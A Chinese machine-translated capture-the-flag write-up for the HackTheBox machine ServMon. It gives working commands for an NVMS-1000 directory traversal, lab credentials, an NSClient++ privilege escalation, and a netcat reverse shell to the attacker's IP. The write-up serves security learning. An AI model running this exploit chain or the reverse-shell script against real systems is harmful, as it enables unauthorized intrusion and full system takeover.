# ServMon — HackTheBox 编写

> 原文：<https://infosecwriteups.com/servmon-hackthebox-writeup-925d74baff17?source=collection_archive---------2----------------------->

## Servmon 是本周即将退役的一款简单难度的 windows 机器。我们将从发现匿名 FTP 访问开始，通过[目录遍历](https://www.exploit-db.com/exploits/48311)从运行在端口 80 上的 NVMS 获得 SSH 信用。对于权限提升，我们通过 SSH 隧道利用 NSClient++并通过它的 [API](https://docs.nsclient.org/api/) 上传我们的恶意脚本。

![](img/b44cb473418c85864fe36fbcab6a6bdb.png)

# 侦察

像往常一样，让我们从 Nmap 扫描开始

```
**Nmap scan report for 10.10.10.184                         
Host is up (0.41s latency).                               

PORT     STATE SERVICE       VERSION                      
21/tcp   open  ftp           Microsoft ftpd                                                                          
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                               
|_01-18-20  12:05PM       <DIR>          Users                                                                       
| ftp-syst:                                               
|_  SYST: Windows_NT                                      
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)                                                                                                                                                                        
| ssh-hostkey:                                                                                                                                                                                                                             
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)                                                       
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)                                                      
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)                                                    
80/tcp   open  http                                       
| fingerprint-strings:                                    
|   FourOhFourRequest:                                    
|     HTTP/1.1 404 Not Found                              
|     Content-type: text/html                             
|     Content-Length: 0                                   
|     Connection: close                                   
|     AuthInfo:                                           
|   GetRequest, HTTPOptions, RTSPRequest:                                                                            
|     HTTP/1.1 200 OK                                     
|     Content-type: text/html                             
|     Content-Length: 340                                 
|     Connection: close                                   
|     AuthInfo:                                           
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "**[**http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd**](http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd)**">                                                                                                            
|     <html ae kf" href="http://www.w3.org/1999/xhtml" rel="noopener ugc nofollow" target="_blank">**http://www.w3.org/1999/xhtml****">                                                                    
|     <head>                                              
|     <title></title>                                     
|     <script type="text/javascript">                     
|     window.location.href = "Pages/login.htm";                                                                      
|     </script>                                           
|     </head>                                             
|     <body>                                              
|     </body>                                             
|_    </html>                                             
|_http-title: Site doesn't have a title (text/html).                                                                 
135/tcp  open  msrpc         Microsoft Windows RPC                                                                   
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                                                           
445/tcp  open  microsoft-ds?                              
5666/tcp open  tcpwrapped                                 
6699/tcp open  napster?                                   
8443/tcp open  ssl/https-alt                              
| fingerprint-strings:                                    
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:                                                         
|     HTTP/1.1 404                                        
|     Content-Length: 18                                  
|     Document not found                                  
|   GetRequest:                                           
|     HTTP/1.1 302                                        
|     Content-Length:0|     Document not found                                  
|   GetRequest:                                           
|     HTTP/1.1 302                                        
|     Content-Length: 0                                   
|     Location: /index.html                               
|     workers                                             
|_    jobs                                                
| http-title: NSClient++                                  
|_Requested resource was /index.html                      
| ssl-cert: Subject: commonName=localhost                 
| Not valid before: 2020-01-14T13:24:20                   
|_Not valid after:  2021-01-13T13:24:20                   
|_ssl-date: TLS randomness does not represent time****
```

# FTP —匿名访问

因为允许匿名 FTP 访问，所以让我们列举 FTP

```
**wget -r ftp://anonymous:saddfd@10.10.10.184/Users**
```

![](img/89f732d974c6fd5719d80ffaa4482194.png)![](img/5746471f227896c6beaa5367e27d9264.png)

我们在`Nathan's`桌面上有一个`passwords.txt`文件，让我们保留它以备将来使用，也许会派上用场。

![](img/fad076c2e2094fcc2edf934c8440b548.png)

# HTTP 80 — NVMS 1000

## 人工访问

在手动访问`[http://10.10.10.184](http://10.10.10.184)`时，我们会看到一个`NVMS 1000`登录页面。

![](img/b7091907802424c65c5dfb5d27fce82a.png)

默认凭证`admin : 123456`不起作用。这是 NVMS-1000 的用户手册

在搜索可能利用`**NVMS-1000**` **、**的漏洞时，我们进行了一次目录遍历，并了解了 Nathan 桌面上的 *passwords.txt 文件*，这次目录遍历可能非常有用。

## 目录遍历

```
**curl --path-as-is** [**http://10.10.10.184/../../../../../../../../../../../../Users/Nathan/Desktop/passwords.txt**](http://10.10.10.184/../../../../../../../../../../../../Users/Nathan/Desktop/passwords.txt) **-s**
```

![](img/0b946d04116cd9b71c021d02de88aa76.png)

# **初始立足点**

因为我们有几个用户名和密码，所以有必要喷一下。我先试试 ssh，因为它直接给了我们一个 shell。

![](img/d10e9e26ff78aeac6147775e3863139c.png)

我们有一个热门话题,《贝壳时间》。

# 贝壳为纳丁

```
**ssh nadine@10.10.10.184    #password L1k3B1gBut7s@W0rk**
```

![](img/0bb90ab1413908305ff52113f672e22e.png)

我们可以从这里获取用户标志。

# 权限提升

在 windows 机器上，在运行任何权限提升脚本之前，我会尝试检查低挂果实，例如，我会检查机器上安装的程序和内核漏洞。这个方法在我的 OSCP 之旅中帮助了我:)，我希望它对你也有帮助…

![](img/e74edb5a4e884f9db3a8ef1ae2164ebd.png)

我们已经安装了 NSClient++，这一点我们已经在初始 Nmap 扫描中看到了。

我们可以通过下面的文章获得`**NSClient++**` 的配置细节

[](https://www.exploit-db.com/exploits/46802) [## 攻击性安全利用数据库档案

### 漏洞作者:bzyo Twitter:@ bzyo _ Exploit Title:ns client ++ 0 . 5 . 2 . 35-权限提升日期:05-05-19…

www.exploit-db.com](https://www.exploit-db.com/exploits/46802) 

```
**nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
Current password: ew2x6SsGTxjRwXOT**
```

## SSH 隧道

读取`**nsclient.ini**` 文件，我们可以看到它只接受来自本地主机的连接。

```
nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini                                                                                                               
# If you want to fill this file with all available options run the following command:                                                                                   ]
#   nscp settings --generate --add-defaults --load-all                                                                                                                     
# If you want to activate a module and bring in all its options use:                                                                                                       
#   nscp settings --activate-module <MODULE NAME> --add-defaults                                                                                                           
# For details run: nscp settings --help                                                                                                                                    

; in flight - TODO                                                                                                                                                         
[/settings/default]                                                                                                                                                        

; Undocumented key                                                                                                                                                         
password = ew2x6SsGTxjRwXOT                                                                                                                                                

***; Undocumented key                                                                                                                                                         
allowed hosts = 127.0.0.1***
```

我用这个隧道 8443 端口，

```
1\. On your SSH shell
2\. Press enter twice
3\. Hit ~C
4\. Now do this ***ssh> -L 8443:127.0.0.1:8443***
```

我可以通过以下方式确认

![](img/7861d95f1a49f1e1f6ed8cd262f78bf0.png)

浏览 NSClient++ API 文档，有一个上传脚本的功能

 [## 脚本- NSClient++

### 脚本 API 可用于读取、查看和修改 NSClient++可以运行的脚本。因为可以提供脚本…

docs.nsclient.org](https://docs.nsclient.org/api/scripts/#add-script) 

```
curl -s -k -u admin -X PUT [https://localhost:8443/api/v1/scripts/ext/scripts/cyber.bat](https://localhost:8443/api/v1/scripts/ext/scripts/cyber.bat) --data-binary [@cyber](http://twitter.com/cyber).bat
```

其中`cyber.bat`是我的恶意脚本。

首先，我将把`**netcat**` exe 上传到机器上，并在`cyber.bat`文件中添加反向连接脚本，从而给我一个反向 shell。

```
**scp nc.exe nadine@10.10.10.184:C:\Users\Nadine\Downloads\nc.exe   ** 
```

这是我的恶意脚本，`cyber.bat`

```
root@kali:~/htb/boxes/servmon# cat cyber.bat 
[@echo](http://twitter.com/echo) off
C:\USers\Nadine\Downloads\nc.exe 10.10.14.132 5555 -e cmd.exe
```

现在，使用一个简单的 cURL 命令

```
curl -s -k -u admin -X PUT [https://localhost:8443/api/v1/scripts/ext/scripts/cyber.bat](https://localhost:8443/api/v1/scripts/ext/scripts/cyber.bat) --data-binary [@cyber](http://twitter.com/cyber).bat
```

这是上面的输出

```
root@kali:~/htb/boxes/servmon# curl -s -k -u admin -X PUT [https://localhost:8443/api/v1/scripts/ext/scripts/cyber.bat](https://localhost:8443/api/v1/scripts/ext/scripts/cyber.bat) --data-binary [@cyber](http://twitter.com/cyber).bat -v                                                        [51/198]
Enter host password for user 'admin':                                                                                                                                                                            
*   Trying ::1:8443...                                                                                                                                                     
* TCP_NODELAY set                                                                                                                                                          
* Connected to localhost (::1) port 8443 (#0)                                                                                                                              
* ALPN, offering h2                                                                                                                                                        
* ALPN, offering http/1.1                                                                                                                                                  
* successfully set certificate verify locations:                                                                                                                           
*   CAfile: none                                                                                                                                                           
  CApath: /etc/ssl/certs                                                                                                                                                   
* TLSv1.3 (OUT), TLS handshake, Client hello (1):                                                                                                                          
* TLSv1.3 (IN), TLS handshake, Server hello (2):                                                                                                                           
* TLSv1.2 (IN), TLS handshake, Certificate (11):                                                                                                                           
* TLSv1.2 (IN), TLS handshake, Server finished (14):                                                                                                                       
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):                                                                                                                  
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):                                                                                                                
* TLSv1.2 (OUT), TLS handshake, Finished (20):                                                                                                                             
* TLSv1.2 (IN), TLS handshake, Finished (20):                                                                                                                              
* SSL connection using TLSv1.2 / AES256-GCM-SHA384                                                                                                                         
* ALPN, server did not agree to a protocol                                                                                                                                 
* Server certificate:                                                                                                                                                      
*  subject: CN=localhost                                                                                                                                                   
*  start date: Jan 14 13:24:20 2020 GMT                                                                                                                                    
*  expire date: Jan 13 13:24:20 2021 GMT                                                                                                                                   
*  issuer: CN=localhost                                                                                                                                                    
*  SSL certificate verify result: self signed certificate (18), continuing anyway.                                                                                         
* Server auth using Basic with user 'admin'                                                                                                                                
> PUT /api/v1/scripts/ext/scripts/cyber.bat HTTP/1.1                                                                                                                       
> Host: localhost:8443                                                                                                                                                     
> Authorization: Basic YWRtaW46ZXcyeDZTc0dUeGpSd1hPVA==                                                                                                                    
> User-Agent: curl/7.66.0                                                                                                                                                  
> Accept: */*                                                                                                                                                              
> Content-Length: 72                                                                                                                                                       
> Content-Type: application/x-www-form-urlencoded                                                                                                                          
>                                                                                                                                                                          
* upload completely sent off: 72 out of 72 bytes                                                                                                                           
* Mark bundle as not supporting multiuse                                                                                                                                   
< HTTP/1.1 200                                 
< Content-Length: 32                           
* Added cookie token="frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ" for domain localhost, path /, expire 0                                                                                              
< Set-cookie: token=frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ; path=/                                  
* Added cookie uid="admin" for domain localhost, path /, expire 0                             
< Set-cookie: uid=admin; path=/                
<                                                   
* Excess found in a read: excess = 318, size = 32, maxdownload = 32, bytecount = 0                      
* Connection #0 to host localhost left intact                                                           
***Added cyber as scripts\cyber.bat***
```

我们已经添加了一个脚本作为`cyber.bat`

通过另一个简单的 cURL 命令执行脚本

```
**curl -s -k -u admin "**[**https://localhost:8443/api/v1/queries/cyber/commands/execute?time=1m**](https://localhost:8443/api/v1/queries/cyber/commands/execute?time=1m)**"**
```

![](img/0be656c70431c785f33e0c2bfeccbf29.png)

我们获得外壳为`**ntauthority\system**`

退出；